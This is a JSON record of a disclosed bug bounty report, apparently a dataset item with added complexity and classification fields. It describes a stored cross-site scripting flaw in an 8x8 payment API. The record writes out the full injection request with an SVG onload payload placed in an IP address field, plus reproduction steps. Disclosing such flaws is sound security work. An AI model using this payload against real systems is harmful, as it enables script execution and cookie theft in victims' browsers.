{
  "reported_to": "8x8 Bounty",
  "reported_by": "pentestor ",
  "title": "Stored xss at https://\u2588.8x8.com/api/\u2588/ID",
  "content": "\nSummary:\nhey ,\ni found a stored xss at https://\u2588\u2588\u2588\u2588\u2588\u2588.8x8.com/api/\u2588\u2588\u2588\u2588\u2588\u2588mentInfoById/ID , when i analysis javascript code i understand user can modify her ip address with endpoint https://\u2588\u2588\u2588.8x8.com/api/patchPaymentMethod/ID , next point i understand when we open https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.8x8.com/api/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588mentInfoById/ID server set Content-Type: text/html;charset=UTF-8 , this was interesting point , then i modify ip address with this request:\nCode 884 Bytes\n1POST /api/patchPaymentMethod/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/2\n2Host: \u2588\u2588\u2588.8x8.com\n3Cookie: ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e; _gcl_au=1.1.275521026.1689699475; _fbp=fb.1.1689701587161.1730712436; __cf_bm=MloB4oUJmeviUXpE1GRUn8TtqbE4CwVEttuZr9tUrOQ-1689845706-0-AWJDz0q9F1c0CmKcbShEYyS7Qqsfd88Gb9W9YsIXUoHhnP/aHA+wGRccAnb8GxD1HBTGXJ71aHh7XzOojjLP/sg=\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Upgrade-Insecure-Requests: 1\n9Sec-Fetch-Dest: document\n10Sec-Fetch-Mode: navigate\n11Sec-Fetch-Site: none\n12Sec-Fetch-User: ?1\n13Te: trailers\n14Content-Type: application/json\n15Content-Length: 112\n16\n17{\n18              \"ipAddress\": \"<svg on onload=(alert)(document.domain)>\",\n19\"callBackURL\":\"dssdsd\"\n20            }\nnow i get response :\nCode 769 Bytes\n1HTTP/2 400 Bad Request\n2Date: Thu, 20 Jul 2023 23:30:32 GMT\n3Content-Length: 0\n4Cache-Control: no-cache, no-store, max-age=0, must-revalidate\n5Expires: 0\n6Pragma: no-cache\n7Strict-Transport-Security: max-age=31536000 ; includeSubDomains\n8X-Content-Type-Options: nosniff\n9X-Frame-Options: DENY\n10X-Gk-Traceid: e97be98a-d5e6-4fce-a6a5-4d5f6d28b02a\n11X-Regional-Id: usw2-gk-65dc71e19a79\n12X-Served-Epoch: 1689895832189\n13X-Xss-Protection: 1; mode=block\n14Cf-Cache-Status: DYNAMIC\n15Set-Cookie: __cf_bm=7dklJH6I0nIayzUSs2ga_6bhxG_AZTclwDwaUIaKeBQ-1689895832-0-AQvIhwqEdRP3rLeIkHe1u4gqwspbam+/6s7/WEIOEsrvvvpuOSaaBNi36GsWEVNOGQWbRBz4Z89eCgjOTdOWGv0=; path=/; expires=Fri, 21-Jul-23 00:00:32 GMT; domain=.8x8.com; HttpOnly; Secure; SameSite=None\n16Server: cloudflare\n17Cf-Ray: 7e9efe156adf41f9-EWR\n18\n19\nthen i check url : https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.8x8.com/api/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588mentInfoById/\u2588\u2588\u2588\u2588\nand i seen ip address updated and \u2588\u2588\u2588\u2588\u2588load successfully executed :\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSteps To Reproduce:\n[add details for how we can reproduce the issue]\nopen url : https://\u2588\u2588\u2588.8x8.com/api/\u2588\u2588\u2588\u2588mentInfoById/\u2588\u2588\u2588\u2588\u2588\nyou can see my injected \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588load executed :D\nSupporting Material/References:\n\u2588\u2588\u2588\nImpact\nStealing cookies and executed javascript in victim browser\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 1337,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1698700680,
  "report_url": "https://hackerone.com/reports/2078490",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Identify the endpoint https://\u2588\u2588\u2588\u2588\u2588\u2588.8x8.com/api/\u2588\u2588\u2588\u2588\u2588\u2588mentInfoById/ID which returns user payment information with Content-Type: text/html;charset=UTF-8."
    ],
    [
      2,
      "Modify the IP address via the endpoint https://\u2588\u2588\u2588.8x8.com/api/patchPaymentMethod/ID with a malicious payload (e.g., <svg on onload=(alert)(document.domain)>)."
    ],
    [
      3,
      "Verify the stored XSS by accessing the modified payment information endpoint and observing the payload execution."
    ]
  ],
  "vuln_description": "A stored Cross-Site Scripting (XSS) vulnerability exists in the payment information endpoint of 8x8.com. An attacker can inject malicious JavaScript via the IP address field, which is then executed when the payment information is retrieved.",
  "reason": "The vulnerability involves understanding the interaction between two endpoints (one for modifying data and one for retrieving it) and recognizing that the server sets Content-Type to text/html, making it susceptible to XSS. The attack requires manipulating the application state by injecting a payload into one endpoint and triggering its execution via another.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The stored XSS vulnerability involves modifying user-controllable input (IP address) to inject malicious JavaScript, which is then executed when the data is retrieved. This does not directly involve authentication or authorization bypass but rather input validation and output encoding issues. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities, which are not the same class as XSS.",
    "is_detectable": false
  }
}